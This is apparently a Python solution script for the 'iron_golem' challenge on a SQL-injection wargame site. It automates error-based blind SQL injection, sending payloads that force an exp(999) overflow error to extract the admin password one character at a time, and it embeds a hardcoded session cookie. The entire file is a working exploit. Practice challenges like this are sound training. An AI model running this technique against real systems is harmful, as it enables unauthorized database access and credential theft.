import requests

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
cookie = dict(PHPSESSID="2fe29pshtdqrc7jtiuetqrncb9")


pw = ""
for i in range(1,33):
    for j in range(40, 128):
        payload = f"' or id='admin' and if(substr(pw,{i},1)='{chr(j)}',1,exp(999)) -- "
        response = requests.get(url, cookies=cookie, params={"pw":payload})
        if "query" in response.text:
            print(j)
            pw += chr(j)
            break
        if j == 127:
            print("fin")
            break

print(pw)